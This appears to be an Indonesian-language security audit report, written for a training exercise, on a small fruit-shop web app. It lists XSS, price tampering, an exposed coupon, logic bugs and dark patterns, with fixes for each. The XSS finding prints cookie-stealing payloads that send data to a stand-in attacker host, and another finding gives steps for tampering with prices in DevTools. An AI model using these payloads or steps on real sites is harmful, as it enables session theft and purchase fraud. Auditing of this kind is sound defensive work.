# 🔍 Laporan Audit — Pasar Pagi
**Tanggal:** 7 Juli 2026  
**Auditor:** Tim Keamanan  
**Scope:** `index.html`, `main.js`, `style.css`  
**Status:** ⚠️ BELUM SIAP PRODUKSI

---

> ⚠️ **CAUTION**  
> Aplikasi ini mengandung **celah keamanan kritis**, **bug logika bisnis**, dan **dark pattern** yang dapat merugikan pengguna. Jangan deploy sebelum semua temuan diselesaikan.

---

## Ringkasan Temuan

| Kategori | Jumlah | Severity |
|----------|--------|----------|
| 🔴 Celah Keamanan (Security) | 4 | Critical / High |
| 🟠 Bug Logika Bisnis | 5 | High / Medium |
| 🟡 Dark Pattern (UX Manipulatif) | 4 | Medium |
| 🔵 Kualitas Kode | 4 | Low |
| **Total** | **17** | |

---

## 🔴 Celah Keamanan (Security Vulnerabilities)

---

### [SEC-01] XSS — Cross-Site Scripting via Note Preview
**Severity:** 🔴 Critical  
**File:** `main.js` | **Baris:** 188

```js
// ❌ VULNERABLE
preview.innerHTML = "Catatan: " + note;  // innerHTML biar tulisannya rapi
```

**Penjelasan:**  
Nilai textarea `note` yang diisi pengguna langsung diinjeksikan ke DOM menggunakan `innerHTML` tanpa sanitasi apapun. Siapapun bisa mengetik payload XSS di kolom catatan.

**Bukti Serangan (Proof of Concept):**  
Ketik ini di kolom *"Catatan buat petani"*:
```html
<img src=x onerror="alert('XSS!')">
```
atau yang lebih berbahaya:
```html
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**Dampak:** Pencurian cookie/session, redirect ke halaman phishing, keylogger, deface UI.

**Catatan:** Di `openReview()` baris 292, catatan justru sudah benar menggunakan `textContent` — inkonsistensi yang mencurigakan seolah disengaja.

---

### [SEC-02] Client-Side Price Manipulation
**Severity:** 🔴 Critical  
**File:** `main.js` | **Baris:** 209, 330

```js
// Event click pada tombol +
addToCart(target.dataset.id, Number(target.dataset.price));  // baris 330

// Di dalam addToCart():
cart[id].price = price;  // pakai harga dari kartu di layar — baris 209
```

**Penjelasan:**  
Harga produk diambil langsung dari atribut `data-price` di DOM HTML. Pengguna bisa membuka DevTools browser, mengubah atribut tersebut, dan menambahkan produk dengan harga yang sudah dimanipulasi.

**Bukti Serangan (Proof of Concept):**
1. Buka DevTools → Inspector
2. Temukan tombol `+` Blueberry (`data-price="5"`)
3. Ubah menjadi `data-price="0.01"`
4. Klik `+` → Blueberry masuk keranjang dengan harga **$0.01**

**Dampak:** Pengguna dapat membeli barang dengan harga sesuka hati. Ini adalah celah e-commerce paling fatal.

---

### [SEC-03] Secret Coupon Hardcoded di Client-Side
**Severity:** 🔴 High  
**File:** `main.js` | **Baris:** 102

```js
// Kupon internal buat teman-teman petani. Jangan disebar ya.
const KUPON_RAHASIA = "TEMANFARMER";
```

**Penjelasan:**  
Kode kupon "rahasia" ini terekspos sepenuhnya di file JavaScript yang bisa diakses siapa saja. Siapapun yang membuka `main.js` di browser (Ctrl+U atau DevTools) dapat langsung melihat kode ini.

**Dampak:**
- Kupon yang seharusnya "internal" bisa digunakan semua orang
- Kupon ini memberikan diskon **90%** — sangat merugikan bisnis

**Cara menemukannya:** Buka browser → Ctrl+U → Cari kata "KUPON" atau "TEMANFARMER"

---

### [SEC-04] Tidak Ada Validasi Server-Side Sama Sekali
**Severity:** 🔴 High  
**File:** Semua file

**Penjelasan:**  
Seluruh logika — harga, kupon, stok, perhitungan total — hanya ada di **client-side JavaScript**. Tidak ada API, tidak ada backend, tidak ada validasi di server. Semua nilai bisa dimanipulasi bebas di browser.

**Dampak:**
- Semua temuan SEC-01 sampai SEC-03 langsung bisa dieksploitasi
- Tidak ada audit trail pesanan yang sesungguhnya
- "Pesanan" yang dikonfirmasi tidak tersimpan di mana pun

---

## 🟠 Bug Logika Bisnis

---

### [BUG-01] Total Harga Tidak Diformat — Floating Point Bug
**Severity:** 🟠 High  
**File:** `main.js` | **Baris:** 196, 304

```js
// Di renderCart() — baris 196
totalPriceEl.textContent = total;  // ❌ tidak ada .toFixed(2)

// Di openReview() — baris 304
`<span>$${total}</span>`           // ❌ tidak ada .toFixed(2)
```

**Penjelasan:**  
JavaScript memiliki masalah klasik floating point. Ketika total dihitung tanpa dibulatkan, hasilnya bisa menjadi angka aneh.

**Contoh Nyata:**
- Pisang ($1.20) + Apel ($1.50) + HANDLING_FEE ($0.30) = **3.0000000000000004**
- Dengan diskon 90%: hasilnya = **0.30000000000000004**

**Dampak:** Total harga yang ditampilkan ke pengguna tidak akurat dan terlihat tidak profesional.

---

### [BUG-02] Stok Produk Berubah Setiap Kali Keranjang Diupdate
**Severity:** 🟠 High  
**File:** `main.js` | **Baris:** 117, 198

```js
// Di renderProducts() — baris 117
const sisa = Math.floor(Math.random() * 5) + 1; // sisa stok hari ini

// Di renderCart() — baris 198
renderProducts();  // dipanggil SETIAP kali keranjang berubah!
```

**Penjelasan:**  
`renderCart()` selalu memanggil `renderProducts()` di akhirnya. Setiap kali pengguna menambah item, mengubah jumlah, atau menghapus item — seluruh kartu produk di-render ulang dan stok random digenerate ulang.

**Demonstrasi Bug:**
1. Lihat "Apel Fuji — tinggal 3 lagi"
2. Tambahkan Jeruk ke keranjang
3. Apel Fuji sekarang berubah jadi "tinggal 1 lagi" tanpa alasan

**Dampak ganda:** Ini adalah bug sekaligus dark pattern (stok palsu + berubah-ubah).

---

### [BUG-03] Input Quantity Menerima NaN — Tidak Ada Validasi
**Severity:** 🟠 Medium  
**File:** `main.js` | **Baris:** 355–357, 231–238

```js
// Event input — baris 356
const quantity = parseInt(target.value, 10);  // jika input "abc" → NaN

// updateQuantity() — baris 233
if (quantity <= 0) {         // NaN <= 0 → false, jadi masuk else!
  delete cart[id];
} else {
  cart[id].count = quantity; // cart[id].count = NaN ← BUG!
}
```

**Penjelasan:**  
Jika pengguna menghapus semua angka dan mengetik huruf, `parseInt` mengembalikan `NaN`. Pengecekan `NaN <= 0` adalah `false`, sehingga `cart[id].count = NaN`. Total harga pun menjadi `NaN`.

**Langkah Reproduksi:**
1. Tambahkan item ke keranjang
2. Klik input angka di sidebar, hapus angkanya
3. Ketik `abc`
4. Total berubah menjadi `NaN`

---

### [BUG-04] Tidak Ada Batas Maksimum Quantity
**Severity:** 🟠 Medium  
**File:** `main.js` | **Baris:** 231–238

```js
function updateQuantity(id, quantity) {
  if (!cart[id]) return;
  if (quantity <= 0) {
    delete cart[id];
  } else {
    cart[id].count = quantity;  // tidak ada batas atas!
  }
  renderCart();
}
```

**Penjelasan:**  
Pengguna dapat memasukkan angka berapapun — 999, 99999, dst. Tidak ada pengecekan stok maksimum atau batas wajar. Atribut `min="1"` di HTML hanya membatasi tampilan UI — bukan logika JavaScript.

---

### [BUG-05] Handling Fee Tidak Transparan
**Severity:** 🟠 Medium  
**File:** `main.js` | **Baris:** 99, 193

```js
const HANDLING_FEE = 0.3;  // didefinisikan tapi tidak diumumkan di UI awal

// Di renderCart() — baris 193
let total = totalPrice + HANDLING_FEE;  // ditambahkan diam-diam ke total
```

**Penjelasan:**  
Biaya penanganan $0.30 ditambahkan ke total di sidebar **tanpa rincian terpisah**. Pengguna baru mengetahui ada biaya ini saat membuka modal review checkout. Ini melanggar prinsip transparansi harga.

---

## 🟡 Dark Pattern (Pola UX Manipulatif)

---

### [DARK-01] False Scarcity — Stok Palsu & Random
**Severity:** 🟡 Medium  
**File:** `main.js` | **Baris:** 117, 128

```js
const sisa = Math.floor(Math.random() * 5) + 1; // sisa stok hari ini
```
```html
<p class="stock">tinggal ${sisa} lagi hari ini!</p>
```

**Penjelasan:**  
Angka stok yang ditampilkan **sepenuhnya dibuat-buat (random 1–5)** dan bukan mencerminkan stok nyata. Kalimat "tinggal X lagi hari ini!" dengan warna oranye mencolok dirancang untuk menciptakan **urgensi palsu** dan memaksa pengguna segera membeli.

---

### [DARK-02] Kupon Diskon 90% — Tidak Masuk Akal Bisnis
**Severity:** 🟡 Medium  
**File:** `main.js` | **Baris:** 246

```js
diskon = 0.9;  // potongan 90% dari total termasuk handling fee
```

**Penjelasan:**  
Dikombinasikan dengan SEC-03 (kupon terekspos di source), siapapun bisa menggunakan kupon ini untuk mendapat diskon 90%.

**Contoh dampak:** Belanja Blueberry ($5.00 + $0.30 handling) → bayar hanya **$0.53**

---

### [DARK-03] Framing Emosional untuk Memanipulasi Keputusan
**Severity:** 🟡 Low  
**File:** `index.html` | **Baris:** 16, 44

```html
<p class="eyebrow">buah segar / pagi yang tenang</p>
<p>barang pilihan yang kebanyakan</p>
<label>Catatan buat petani</label>
```

**Penjelasan:**  
Elemen teks dirancang untuk membangun koneksi emosional:
- **"pagi yang tenang"** — menciptakan suasana untuk menurunkan kewaspadaan
- **"barang pilihan yang kebanyakan"** — confirm shaming halus
- **"Catatan buat petani"** — membangun rasa empati/bersalah kepada petani

---

### [DARK-04] Handling Fee Tersembunyi (Hidden Fee)
**Severity:** 🟡 Medium  
**File:** `main.js`, `index.html`

**Penjelasan:**  
Biaya penanganan $0.30 tidak pernah disebutkan di halaman produk maupun sidebar utama. Pengguna baru mengetahuinya **setelah menekan tombol "Lanjut ke Pembayaran"** dan masuk ke modal review. Ini adalah pola klasik *hidden fee* yang umum ditemukan di dark-pattern e-commerce.

---

## 🔵 Kualitas Kode (Code Quality)

---

### [CODE-01] renderProducts() Dipanggil Berlebihan dari renderCart()
**File:** `main.js` | **Baris:** 157, 198

`renderCart()` selalu memanggil `renderProducts()` di akhirnya — termasuk ketika keranjang kosong. Ini menyebabkan **seluruh grid produk di-render ulang setiap kali ada perubahan di keranjang** — tidak efisien dan menjadi akar dari BUG-02 dan DARK-01.

---

### [CODE-02] Tidak Ada Persistensi Data (localStorage)
**File:** `main.js`

Objek `cart` hanya disimpan di memori JavaScript. Jika pengguna me-refresh halaman, semua isi keranjang hilang tanpa peringatan. Tidak ada penggunaan `localStorage` atau `sessionStorage`.

---

### [CODE-03] Tidak Ada Konfirmasi atau Bukti Pesanan
**File:** `main.js` | **Baris:** 314–323

Setelah `placeOrder()` dipanggil, semua data pesanan dihapus dan hanya muncul toast "Pesanan masuk!". Tidak ada halaman konfirmasi, nomor pesanan, atau jejak apapun bahwa pesanan pernah dibuat.

---

### [CODE-04] Heading Hierarchy Tidak Konsisten
**File:** `index.html`

- `<h1>` di header (Pasar Pagi) ✅
- `<h2>` di setiap kartu produk untuk nama buah ⚠️
- `<h2>` juga di sidebar ("Keranjang Kamu") ⚠️

Struktur heading tidak hierarkis — membingungkan screen reader dan merusak SEO.

---

## Matriks Prioritas Perbaikan

| Prioritas | ID | Masalah | Effort Perbaikan |
|-----------|-----|---------|-----------------|
| 🔴 P0 | SEC-01 | Ganti `innerHTML` → `textContent` di note preview | Rendah |
| 🔴 P0 | SEC-02 | Validasi harga dari server, jangan ambil dari DOM | Tinggi |
| 🔴 P0 | SEC-03 | Pindahkan validasi kupon ke server-side | Tinggi |
| 🟠 P1 | BUG-01 | Tambahkan `.toFixed(2)` di semua tampilan total | Rendah |
| 🟠 P1 | BUG-03 | Validasi `NaN` dan batas angka di `updateQuantity()` | Rendah |
| 🟠 P1 | BUG-02 | Pisahkan `renderProducts()` dari `renderCart()` | Medium |
| 🟡 P2 | DARK-01 | Hapus stok random, gunakan data stok nyata | Medium |
| 🟡 P2 | DARK-04 | Tampilkan handling fee sejak awal di sidebar | Rendah |
| 🔵 P3 | CODE-02 | Tambahkan `localStorage` untuk persistensi keranjang | Medium |

---

*Laporan ini dibuat untuk keperluan latihan audit keamanan (GASIN — Hari 2).  
Semua temuan berdasarkan analisis statis kode sumber.*
